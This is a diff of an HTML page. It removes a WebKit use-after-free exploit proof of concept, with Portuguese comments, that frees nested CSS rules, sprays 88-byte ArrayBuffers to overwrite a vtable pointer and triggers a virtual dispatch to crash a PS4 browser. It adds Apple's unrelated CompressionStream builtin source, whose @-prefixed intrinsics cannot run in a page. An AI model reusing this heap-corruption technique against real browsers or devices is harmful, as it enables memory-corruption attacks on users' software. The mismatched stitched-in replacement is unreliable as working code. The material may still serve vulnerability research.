@@ -2,56 +2,125 @@
 <html>
 <body>
 <script>
-function gc() {
-    function gcRec(n) {
-        if (n < 1) return {};
-        var temp = {i: "ab" + i + (i / 100000)};
-        temp += "foo";
-        gcRec(n-1);
-    }
-    for (var i = 0; i < 10000; i++)
-        gcRec(10);
+/*
+* Copyright (C) 2022 Apple Inc. All rights reserved.
+*
+* Redistribution and use in source and binary forms, with or without
+* modification, are permitted provided that the following conditions
+* are met:
+*
+* 1.  Redistributions of source code must retain the above copyright
+*     notice, this list of conditions and the following disclaimer.
+* 2.  Redistributions in binary form must reproduce the above copyright
+*     notice, this list of conditions and the following disclaimer in the
+*     documentation and/or other materials provided with the distribution.
+*
+* THIS SOFTWARE IS PROVIDED BY APPLE AND ITS CONTRIBUTORS "AS IS" AND ANY
+* EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+* WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+* DISCLAIMED. IN NO EVENT SHALL APPLE OR ITS CONTRIBUTORS BE LIABLE FOR ANY
+* DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+* (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+* LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
+* ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+* (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
+* THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+*/
+
+function initializeCompressionStream(format)
+{
+    "use strict";
+
+    const errorMessage = "CompressionStream requires a single argument with the value 'brotli', 'deflate', 'deflate-raw', or 'gzip'.";
+
+    if (arguments.length < 1)
+        @throwTypeError(errorMessage);
+
+    const algorithms = ['brotli', 'gzip', 'deflate', 'deflate-raw'];
+    const lowercaseFormat = @toString(arguments[0]).toLowerCase();
+    const findAlgorithm = (element) => element === lowercaseFormat;
+
+    // Pass the index to our new CompressionStreamEncoder, so we do not need to reparse the string.
+    // We need to ensure that the Formats.h and this file stay in sync.
+    const index = algorithms.findIndex(findAlgorithm);
+
+    if (index === -1)
+        @throwTypeError(errorMessage);
+
+    // Setup Transform and Flush Algorithms
+    const startAlgorithm = () => {
+        return @promiseResolve(@Promise, @undefined);
+    };
+    const transformAlgorithm = (chunk) => {
+        if (!@isObject(chunk) || (!(chunk instanceof @ArrayBuffer) && !(chunk.buffer instanceof @ArrayBuffer)))
+            return @promiseReject(@Promise, @makeTypeError("Invalid type should be ArrayBuffer"));
+
+        try {
+            const encoder = @getByIdDirectPrivate(this, "CompressionStreamEncoder");
+
+            let buffer = encoder.@encode(chunk);
+            if (buffer) {
+                const transformStream = @getByIdDirectPrivate(this, "CompressionStreamTransform");
+                const controller = @getByIdDirectPrivate(transformStream, "controller");
+                @transformStreamDefaultControllerEnqueue(controller, buffer);
+            }
+        } catch (e) {
+            return @promiseReject(@Promise, @makeTypeError(e.message));
+        }
+
+        return @promiseResolve(@Promise, @undefined);
+    };
+    const flushAlgorithm = () => {
+        const encoder = @getByIdDirectPrivate(this, "CompressionStreamEncoder");
+
+        let buffer;
+        try {
+            buffer = encoder.@flush();
+        } catch (e) {
+            return @promiseReject(@Promise, @makeTypeError(e.message));
+        }
+        if (buffer) {
+            const transformStream = @getByIdDirectPrivate(this, "CompressionStreamTransform");
+            const controller = @getByIdDirectPrivate(transformStream, "controller");
+            @transformStreamDefaultControllerEnqueue(controller, buffer);
+        }
+
+        return @promiseResolve(@Promise, @undefined);
+    };
+
+    const streams = @createTransformStream(startAlgorithm, transformAlgorithm, flushAlgorithm);
+    const transform = streams[0];
+    const readable = streams[1];
+    const writable = streams[2];
+    @putByIdDirectPrivate(this, "CompressionStreamTransform", transform);
+    @putByIdDirectPrivate(this, "readable", readable);
+    @putByIdDirectPrivate(this, "writable", writable);
+    @putByIdDirectPrivate(this, "CompressionStreamEncoder", new @CompressionStreamEncoder(index));
+    return this;
 }
 
-// Fase 1: UAF setup (igual)
-const style = document.createElement("style");
-document.head.appendChild(style);
-const sheet = style.sheet;
-sheet.insertRule(".outer { color: red; & .nested { color: blue; } }", 0);
+@getter
+function readable()
+{
+    "use strict";
 
-let nestedRules = sheet.cssRules[0].cssRules;
-sheet.deleteRule(0);
-gc();
+    const transform = @getByIdDirectPrivate(this, "CompressionStreamTransform");
+    if (!transform)
+        throw @makeThisTypeError("CompressionStreamEncoder", "readable");
 
-const nested = nestedRules[0];
-nestedRules = null;
-gc();
-
-let danglingParent = nested.parentRule;
-document.write("Dangling: " + (danglingParent !== null) + "<br>");
-
-// Fase 2: Spray ArrayBuffer de exatamente 88 bytes
-// WTF::fastMalloc usa o mesmo pool que new CSSStyleRule
-// ArrayBuffer backing store de 88 bytes → mesmo bucket de 96 bytes
-let spray = [];
-for (let i = 0; i < 20000; i++) {
-    let buf = new ArrayBuffer(88);
-    let view = new DataView(buf);
-    // Sobrescrever offset 0 (onde vtable ptr estaria) com NULL
-    // → virtual dispatch → dereference NULL → SIGSEGV → crash PS4
-    view.setFloat64(0, 0.0, true); // 0x0000000000000000 no offset 0
-    // Ou para crash mais controlado:
-    // view.setBigUint64(0, 0x4141414141414141n, true); // "AAAAAAAA"
-    spray.push(buf);
+    return @getByIdDirectPrivate(this, "readable");
 }
 
-// Fase 3: Se o chunk foi reusado, vtable[0] = 0x0 → crash no dispatch
-document.write("Tentando dispatch com vtable corrompida...<br>");
-try {
-    let result = danglingParent.selectorText; // virtual dispatch → crash se vtable = 0
-    document.write("Sem crash, resultado: " + result);
-} catch(e) {
-    document.write("EXCEPTION: " + e);
+@getter
+function writable()
+{
+    "use strict";
+
+    const transform = @getByIdDirectPrivate(this, "CompressionStreamTransform");
+    if (!transform)
+        throw @makeThisTypeError("CompressionStreamEncoder", "writable");
+
+    return @getByIdDirectPrivate(this, "writable");
 }
 </script>
 </body>
